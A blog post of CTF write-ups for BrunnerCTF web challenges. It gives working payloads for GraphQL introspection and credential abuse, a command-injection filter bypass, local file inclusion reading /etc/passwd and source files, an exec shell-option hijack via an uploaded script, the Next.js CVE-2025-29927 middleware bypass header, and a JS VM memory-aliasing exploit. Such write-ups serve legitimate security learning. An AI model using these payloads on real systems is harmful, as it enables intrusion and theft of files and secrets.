---
layout: post
title:  "brunnerctf postmortem"
date:   2025-08-29 09:29:20 +0700
categories: jekyll update
usemathjax: true
---

# BrunnerCTF writeups and postmortem

## > Brunner's Bakery (Web, 315 solves)
the challenge description:
`Recent Graphs show that we need some more Quality of Life recipes! Can you go check if the bakery is hiding any?!`

this, and from the source code
```html
<!DOCTYPE html> 
<html> 
    <head> 
        <title>Brunner's Bakery</title> 
        <style> body { font-family: sans-serif; background: #fff8f8; padding: 20px; } h1 { color: #d6336c; } .grid { display: grid; grid-template-columns: repeat(auto-fill,minmax(250px,1fr)); gap: 1rem; } .card { background: white; border-radius: 10px; padding: 1rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1); } .title { font-size: 1.2rem; color: #d6336c; } .author { color: #666; font-size: 0.9rem; } .desc { margin-top: 0.5rem; color: #444; } </style> 
        </head>
    <body> 
        <h1>Brunner's Bakery</h1> 
        <p>Sweet treats, baked fresh daily</p> 
        <div id="recipes" class="grid"></div> 
        <script> 
            fetch('/graphql', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query: 'query { publicRecipes { name description author { displayName } ingredients { name } } }' }) }) .then(res => res.json()) .then(data => { const container = document.getElementById('recipes'); 
            (data.data.publicRecipes || []).forEach(r => { const div = document.createElement('div'); div.className = 'card'; 
            div.innerHTML = '<div class="title">' + r.name + '</div>' + '<div class="author">by ' + r.author.displayName + '</div>' + '<div class="desc">' + r.description + '</div>' + '<div style="font-size:0.8rem;color:#777;margin-top:0.5rem;">Ingredients: ' + r.ingredients.map(i => i.name).join(', ') + '</div>'; container.appendChild(div); }); }); 
            </script> 
    </body> 
</html>
```

...exposing a `/graphql` endpoint, we can infer that this is a graphql challenge

we can send a POST request to `/graphql` to query the graphql. some basic introspection:

`curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
`

```
┌──(venv)─(kali㉿kali)-[~/Desktop/forensics_new-order] 
└─$ curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql \ -H 

"Content-Type: application/json" \ -d '{"query":"{ __schema { types { name fields { name } } } }"}' {"data":{"__schema":{"types":[{"name":"Query","fields":[{"name":"publicRecipes"},{"name":"secretRecipes"},{"name":"me"}]},{"name":"Mutation","fields":[{"name":"login"}]},{"name":"String","fields":null},{"name":"AuthPayload","fields":[{"name":"token"},{"name":"user"}]},{"name":"Recipe","fields":[{"name":"id"},{"name":"name"},{"name":"description"},{"name":"isSecret"},{"name":"author"},{"name":"ingredients"}]},{"name":"ID","fields":null},{"name":"Boolean","fields":null},{"name":"Ingredient","fields":[{"name":"name"},{"name":"supplier"}]},{"name":"Supplier","fields":[{"name":"id"},{"name":"name"},{"name":"owner"}]},{"name":"User","fields":[{"name":"id"},{"name":"username"},{"name":"displayName"},{"name":"email"},{"name":"notes"},{"name":"privateNotes"},{"name":"recipes"}]},{"name":"__Schema","fields":[{"name":"description"},{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}]},{"name":"__Type","fields":[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"specifiedByURL"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},{"name":"ofType"},{"name":"isOneOf"}]},{"name":"__TypeKind","fields":null},{"name":"__Field","fields":[{"name":"name"},{"name":"description"},{"name":"args"},{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__InputValue","fields":[{"name":"name"},{"name":"description"},{"name":"type"},{"name":"defaultValue"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__EnumValue","fields":[{"name":"name"},{"name":"description"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__Directive","fields":[{"name":"name"},{"name":"description"},{"name":"isRepeatable"},{"name":"locations"},{"name":"args"}]},{"name":"__DirectiveLocation","fields":null}]}}}
```

there's a field called 'secretRecipes', which could be where our flag is. 

`curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ secretRecipes { id name description isSecret author { displayName } ingredients { name supplier { name } } } }"}'
`

```
{"errors":[{"message":"Access denied. admin only.","locations":[{"line":1,"column":3}],"path":["secretRecipes"],"extensions":{"code":"UNAUTHENTICATED","exception":{"stacktrace":["AuthenticationError: Access denied. admin only."," at Object.secretRecipes (/app/server.js:213:15)"," at field.resolve (/app/node_modules/apollo-server-core/dist/utils/schemaInstrumentation.js:56:26)"," at executeField (/app/node_modules/graphql/execution/execute.js:500:20)"," at executeFields (/app/node_modules/graphql/execution/execute.js:422:22)"," at executeOperation (/app/node_modules/graphql/execution/execute.js:352:14)"," at execute (/app/node_modules/graphql/execution/execute.js:136:20)"," at execute (/app/node_modules/apollo-server-core/dist/requestPipeline.js:207:48)"," at processGraphQLRequest (/app/node_modules/apollo-server-core/dist/requestPipeline.js:150:34)"," at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"," at async processHTTPRequest (/app/node_modules/apollo-server-core/dist/runHttpQuery.js:222:30)"]}}}],"data":null}
```

we got blocked because we don't have admin creds.

not to worry, let's find another way in.

looking at the public recipes:

```
{
  "data": {
    "publicRecipes": [
      {
        "author": {
          "username": "sally",
          "privateNotes": null
        }
      },
      {
        "author": {
          "username": "sally",
          "privateNotes": null
        }
      },
      ...
    ]
  }
}
```

one username is `sally`. let's look deeper by querying her profile information via referencing it from `recipes`:

```
{
  publicRecipes {
    id
    name
    description
    author {
      username
      email
      notes
      privateNotes
    }
  }
}
```

result:
```
"publicRecipes": [ { "id": "r1", "name": "Lemon Drizzle", "description": "A zesty lemon drizzle cake for the window display.", "author": { "username": "sally", "email": "sally@brunners.local", "notes": "TODO: Remove temporary credentials... brunner_admin:Sw33tT00Th321?", "privateNotes": null } },
```

bingo, we have admin credentials. we can use this at the `login` mutation to generate a valid jwt token, then include it in the `Authorization` header of the POST request.

```
mutation {
  login(username:"brunner_admin", password:"Sw33tT00Th321?") {
    token
    user {
      id
      username
    }
  }
}
mutation {
  login(username:"brunner_admin", password:"Sw33tT00Th321?") {
    token
    user {
      id
      username
    }
  }
}
```

result:
```
{ "data": { "login": { "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InUyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU1ODY3ODA4LCJleHAiOjE3NTU4NzUwMDh9.b3cJfjrYblHcppy4Z_gBfjFg-0cayUTqRwFBc_9BCcI", "user": { "id": "u2", "username": "brunner_admin" } } } }
```

now we can read ```secretRecipes``` via curl:

```
curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InUyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU1ODY3ODA4LCJleHAiOjE3NTU4NzUwMDh9.b3cJfjrYblHcppy4Z_gBfjFg-0cayUTqRwFBc_9BCcI" \
  -d '{"query":"{ secretRecipes { id name description author { username email } } }"}'
```

result
```
{"data":{"secretRecipes":[{"id":"r_secret_1","name":"The Golden Gateau","description":"A secret signature cake used for VIP orders.","author":{"username":"brunner_admin","email":"admin@brunners.local"}}]}}
```

i wasnt really sure what to do from here, but then i looked at recipes and remembered that they have an `ingredients` field with attributes for their `supplier`s, which are also users with private notes:

```
curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql \ 
    -H "Content-Type: application/json" \ 
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InUyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU1ODY3ODA4LCJleHAiOjE3NTU4NzUwMDh9.b3cJfjrYblHcppy4Z_gBfjFg-0cayUTqRwFBc_9BCcI" \ 
    -d '{"query":"{ secretRecipes { id name description isSecret author { id username displayName email notes privateNotes recipes { id name description isSecret } } ingredients { name supplier { id name owner { id username email } } } } }"}'
```

result:
```
{"data":{"secretRecipes":[{"id":"r_secret_1","name":"The Golden Gateau","description":"A secret signature cake used for VIP orders.","isSecret":true,"author":{"id":"u2","username":"brunner_admin","displayName":"Brunner Admin","email":"admin@brunners.local","notes":"Head baker","privateNotes":null,"recipes":[{"id":"r_secret_1","name":"The Golden Gateau","description":"A secret signature cake used for VIP orders.","isSecret":true}]},"ingredients":[{"name":"Rare Cocoa","supplier":{"id":"s1","name":"Heavenly Sugar Co","owner":{"id":"u4","username":"grandmaster_brunner","email":"gm@brunners.local"}}},{"name":"Aged Butter","supplier":{"id":"s2","name":"Golden Eggs Ltd","owner":{"id":"u3","username":"junior_baker","email":"tim@brunners.local"}}}]}]}}
```

let's try to take a look at users `u4` and `u3` with usernames `grandmaster_brunner` and `junior_baker`.

```
curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InUyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU1ODY3ODA4LCJleHAiOjE3NTU4NzUwMDh9.b3cJfjrYblHcppy4Z_gBfjFg-0cayUTqRwFBc_9BCcI" \
  -d '{"query":"{ secretRecipes { name ingredients { name supplier { name owner { id username displayName email notes privateNotes recipes { id name description isSecret } } } } } }"}'
```

due to my earlier dawdling my jwt expired so it blocked me
```
{"errors":[{"message":"Access denied. admin only.","locations":[{"line":1,"column":3}],"path":["secretRecipes"],"extensions":{"code":"UNAUTHENTICATED","exception":{"stacktrace":["AuthenticationError: Access denied. admin only."," at Object.secretRecipes (/app/server.js:213:15)"," at field.resolve (/app/node_modules/apollo-server-core/dist/utils/schemaInstrumentation.js:56:26)"," at executeField (/app/node_modules/graphql/execution/execute.js:500:20)"," at executeFields (/app/node_modules/graphql/execution/execute.js:422:22)"," at executeOperation (/app/node_modules/graphql/execution/execute.js:352:14)"," at execute (/app/node_modules/graphql/execution/execute.js:136:20)"," at execute (/app/node_modules/apollo-server-core/dist/requestPipeline.js:207:48)"," at processGraphQLRequest (/app/node_modules/apollo-server-core/dist/requestPipeline.js:150:34)"," at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"," at async processHTTPRequest (/app/node_modules/apollo-server-core/dist/runHttpQuery.js:222:30)"]}}}],"data":null}
```

back on track with a valid jwt
```
curl -s -X POST https://brunner-s-bakery.challs.brunnerne.xyz/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InUyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzU1ODY4NjU2LCJleHAiOjE3NTU4NzU4NTZ9.oE_HOPNy4BQeM22YRVyVABjUjsibMY-KE_K1ny1EzFI" \
  -d '{"query":"{ secretRecipes { name ingredients { name supplier { name owner { id username displayName email notes privateNotes } } } } }"}'
```
we can get the flag in the private notes of the grandmaster brunner (image taken from someone in the discord since i forgor to copy down the last result)

![final](/images/brunner_images/bakery_final.jpg)

flag: `brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}`

## > Baking Bad (Web, 339 solves)
From the challenge description:

`Luckily, the developers at Brunnerne have come up with a bash -c 'recipe' that can simulate the baking process.
`

The website has a textbox that accepts user input and generates a 'Purity' value. since the challenge description tells us that this is done through a command, we can attempt command injection.

we start off simple to list all files in the directory with `; ls -la`. this payload escapes the previous command by ending it early with a `;` and injects our new command, 'ls -la', but we are blocked with an error due to unauthorised characters in our input.

through trial and error, we can figure out that the blocked characters include ` ` (space), `()` (parentheses), `/` (forward slash), `*` (asterisk), `<` (left triangle bracket), `,` (comma)

that's okay, we can still make an attempt to list directory contents by eliminating the space and -la in our original payload, to make: `;ls`

result: `index.php quality.sh static`

attempts to `cat`, `echo` or `read` any of the files are blocked by either the characters filter or another filter that blocks commands like `rm` `cat` `cp` `touch` `echo` `read`.

let's first bypass the command filter in order to call `cat` on `index.php`. this can be done by the payload `'c''at'` that splits `cat` into two single-quoted strings.

then to include a space between `cat` and `index.php` we can make use of the Internal Field Separator `${IFS}` to inject a space between the two fields, bypassing the filter that blocks spaces.

payload: `;'c''at'${IFS}'index.php'`
```php 
$denyListCharacters = ['"', '*', '/', ' ', '<', '(', ')', '[', ']', '\\'];
$denyListCommands = ['rm', 'mv', 'cp', 'cat', 'echo', 'touch', 'chmod', 'chown', 'kill', 'ps', 'top', 'find'];
function loadSecretRecipe() { 
    file_get_contents('/flag.txt'); 
} 
function sanitizeCharacters($input) { 
    for ($i = 0; $i < strlen($input); $i++) { 
        if (in_array($input[$i], $GLOBALS['denyListCharacters'], true)) { 
            return 'Illegal character detected!'; } 
        } 
        return $input;
    } 
function sanitizeCommands($input) { 
    foreach ($GLOBALS['denyListCommands'] as $cmd {    
        if (stripos($input, $cmd) !== false) {      
            return 'Illegal command detected!'; 
        } 
    } 
        return $input; 
    } 
function analyze($ingredient) { 
    $tmp = sanitizeCharacters($ingredient); 
    if ($tmp !== $ingredient) { return $tmp; } 
    $tmp = sanitizeCommands($ingredient); 
    if ($tmp !== $ingredient) { return $tmp; } 
    return shell_exec("bash -c './quality.sh $ingredient' 2>&1"); } $result = $ingredient !== '' ? analyze($ingredient) : '';
```

we want to read /flag.txt. however, recall that forward slashes `/` are blocked by the character filter.

to bypass this, note that the `$PWD` constant, referring to the path to the root directory, will contain a slash (eg. `/root/`)

we can use string slicing to extract the first character of $PWD and combine it with the original `cat` splitting and `$IFS` to cat `/flag.txt`.

final payload: `;'c''at'${IFS}${PWD:0:1}flag.txt`

flag: `brunner{d1d_1_f0rg37_70_b4n_s0m3_ch4rz?}`

## > Brunsviger Husset (Web, 291 solves)
an interesting part of the source code:
```js
const printUrl = 'print.php?file=/var/www/html/bakery-calendar.php&start=2025-07&end=2025-09';
```

the file parameter is directly passed to print.php. if this isn't sanitised properly, this can lead to a Local File Inclusion (LFI) vulnerability, letting us read files on the backend.

let's try the per-procedure to pass `/etc/passwd` to the file parameter, and attempt to read it:

```
/print.php?file=/etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

it can be read, so this site is vulnerable to lfi.

visiting `/robots.txt`: 
```
User-agent: * Allow: /index.php Allow: /bakery-calendar.php Disallow: /print.php Disallow: /secrets.php
```

let's try to LFI `secrets.php`:
```
/print.php?file=/secrets.php
```

the site is blank. that makes sense, since the php is being run on the backend.

we can get it to spit out the source by base64 encoding the file contents, then decoding:

```
/print.php?file=php://filter/convert.base64-encode/resource=secrets.php
```
```
PD9waHAKLy8gS2VlcCB0aGlzIGZpbGUgc2VjcmV0LCBpdCBjb250YWlucyBzZW5zaXRpdmUgaW5mb3JtYXRpb24uCiRmbGFnID0gImJydW5uZXJ7bDBjNGxfZjFsM18xbmNsdXMxMG5fMW5fdGgzX2I0azNyeX0iOwo/Pgo=
```

decode in a platform such as CyberChef:
```php
<?php
// Keep this file secret, it contains sensitive information.
$flag = "brunner{l0c4l_f1l3_1nclus10n_1n_th3_b4k3ry}";
?>
```

flag: `brunner{l0c4l_f1l3_1nclus10n_1n_th3_b4k3ry}`

## > Recipe For Disaster (Web, 107 solves)
`/api/settings` does a deep merge of your JSON into `app.locals.settings`:
```js
deepMerge(app.locals.settings, req.body);
```

Later, /export uses those merged settings as options to child_process.exec:
```js
const baseOpts = Object.assign({}, app.locals.settings.exportOptions || {});
const envFromSettings = baseOpts.env || {};      // (they try to delete env earlier)
const env = Object.assign({}, process.env, envFromSettings);
const opts = Object.assign({}, baseOpts, { cwd: __dirname, env });
exec(cmd, opts, (err, stdout, stderr) => { ... });
```

they block `exportOptions.env` in `/api/settings`, but they don’t block `exportOptions.shell` (or other exec options like `uid`, `gid`, `timeout`, `maxBuffer`, etc.).

`exec` will run your command through whatever shell you set in `opts.shell`. If we point `shell` to our own script, our script runs first and can print `/flag.txt` before delegating to a real shell.

therefore, let's upload a shell and read the flag.

```bash
curl -s -X POST https://recipe-for-disaster-72bf042470e3a9aa.challs.brunnerne.xyz/api/note \
  -H 'Content-Type: application/json' \
  -d '{
        "name": "brun1",
        "filename": "sh",
        "makeExecutable": true,
        "content": "#!/bin/sh\ncat /flag.txt\nexec /bin/sh \"$@\""
      }'

```

get the server to use our shell as shim:
```bash
curl -s -X POST https://recipe-for-disaster-72bf042470e3a9aa.challs.brunnerne.xyz/api/settings \
  -H 'Content-Type: application/json' \
  -d '{ "exportOptions": { "shell": "./data/brun1/sh" } }'

```

run shim:

```bash
curl -s "https://recipe-for-disaster-72bf042470e3a9aa.challs.brunnerne.xyz/export?name=brun1"
```

flag: `brunnerCTF{pr0t0typ3_p011u710n_0v3rfl0w1ng_7h3_0v3n}`

## > EPIC CAKE BATTLES OF HISTORY!!! (Web, 131 solves)

requests to `/admin` trigger a `middleware.ts` which redirects you back to `/` if you arent admin:
```typescript
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

// This function can be marked `async` if using `await` inside
export function middleware(request: NextRequest) {
  // @ts-ignore
    if("CHAMPION" == "FOUND")
        return NextResponse.redirect(new URL('/admin', request.url))
  return NextResponse.redirect(new URL('/', request.url))
}

// See "Matching Paths" below to learn more
export const config = {
  matcher: '/admin/:path*',
}

```

which is effectively impossible to override because the check is hardcoded

for context, the next.js framework sometimes issues subrequests (e.g., prefetching or API calls triggered by middleware itself).

to avoid infinite loops (middleware calling itself repeatedly), Next.js uses an internal header:

`x-middleware-subrequest`


this header carries a colon-separated list of middleware names that have already been executed.

before running, `runMiddleware()`checks:

```js
const subreq = request.headers["x-middleware-subrequest"];
const subrequests = typeof subreq === "string" ? subreq.split(":") : [];

if (subrequests.includes(middlewareInfo.name)) {
    // Skip this middleware entirely
    return NextResponse.next();
}
```

if the header says "middleware" already ran, Next.js skips it.

doing some googling to find any potential vulnerability yields this report on [CVE-2025-29927 Next.js Middleware Authorization Bypass](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)

quote: 
```
The vulnerability in CVE-2025-29927 stems from a design flaw in how Next.js processes the x-middleware-subrequest header. This header was originally intended for internal use within the Next.js framework to prevent infinite middleware execution loops.When a Next.js application uses middleware, the runMiddleware function is called to process incoming requests. As part of its functionality, this function checks for the presence of the x-middleware-subrequest header. If this header exists and contains a specific value, the middleware execution is skipped entirely, and the request is forwarded directly to its original destination via NextResponse.next().
```

reading the dependencies:
```text
"packages": { "": { "name": "epic-cake-battles", "version": "0.1.0", "dependencies": { "next": "15.2.2", "react": "^19.0.0", "react-dom": "^19.0.0" }, ...
```

referring to the above article to view the correct exploit (version `13.2.0` and later:)

```text
Alternatively, for projects using a /src directory structure:

x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:
```

literally just add the above as a header to the request and it will yield the flag.

flag: `brunner{0th3llo-iz-b3st-cake}`


## > ArrayVM (Web, 39 solves)
the website allows us to script in an array indexing-based programming language (that happens to be implemented in js)

there’s one real storage: `this.backing`, a plain Array (i.e., a sparse object with special behavior for non‑negative 32‑bit indices).

the flag is stashed at key -1:

```js
this.backing[-1] = fs.readFileSync("./flag.txt");
```

js has a language quirk where negative indexes are just string properties ("-1"), not elements. but `this.backing[-1]` still returns the value: property lookup works for any string key.

every 'array' in the VM is a slice of `this.backing`.
```
backing[B]         = size
backing[B + 1]     = elem[0]
backing[B + 2]     = elem[1]
...
```

addressing an element uses:
```
B + idx + 1
```

and there’s a bounds check `idx < size`. (notice how there’s no check that the final computed address is non‑negative.)

creating a new VM array chooses its base by walking past the previous one:
```
newBacking = lastBacking + lastSize + 1;
```

so we have our exploit path: if we can make `lastSize` negative enough, `newBacking` becomes negative, and then choosing an `idx` can hit `-1` (the flag).

in js, all numbers are IEEE‑754 doubles (53 bits of integer precision). essentially, this means that:
- every integer is exactly representable up to `2^53` (= 9007199254740992).

- for numbers `≥ 2^53`, the spacing between representable integers becomes `2`.
So `2^53 + 1` rounds to `2^53`; the next representable is `2^53 + 2`.

two places in the VM add +1:

- when placing the next array: `newBacking = lastBacking + lastSize + 1`

- when computing an element address: `B + idx + 1`.

if we force a base B to be exactly `2^53`, then `B + 1` rounds back to `B`, which means `elem[0]` aliases the header (which is at B). this gives us a header‑overwrite primitive: any write to `elem[0]` will write to the size field instead.

to get such a `B` we make the previous array's size `2^53`.
```
newBacking = lastBacking + lastSize + 1
           = 0 + 2^53 + 1
```

once we can write to the size field of array #1 via its `elem[0]`, we set it to a large negative number. this will cause the next `NEW` to
```
B_next = B_alias + size_overwritten + 1
       = 2^53   + ( -2^53 - x ) + 1
       = -x + 1
```

we pick `x` to be `4`, so that `B_next` = `-3`. this is because if `x` were `2`, `B_next` = `-2 + 1` = `-1`, which places the next array's header at `-1`, writing over the flag.

with `B_next` = `-3`, the header goes to `-3` (safe), and then `elem[1]` sits at `-3 + 1 + 1` = `-1`.

we can use `SUB` to compute negatives:
```ini
size1 = 0 - (2^53 + 4) = -2^53 - 4
```

so the following VM program will spit out the flag:
```nginx
NEW 9007199254740992

NEW 1

INIT 0.0 0
INIT 0.1 9007199254740996

# aliasing bug:
# size1 = 0 - (2^53 + 4) = -9007199254740996
SUB 0.0 0.1 1.0

# B2 = (2^53) + (-2^53 - 4) + 1 = -3
NEW 2

PRINT 2.1
```

the bounds check (```if (!(idx < arrSize)) throw ...```) implemented doesn't help here because this only violates logic, not the physical address. the VM never verifies that size is non‑negative or a safe integer.   

flag: `brunner{I_was_certain_using_arrays_was_a_good_idea}`


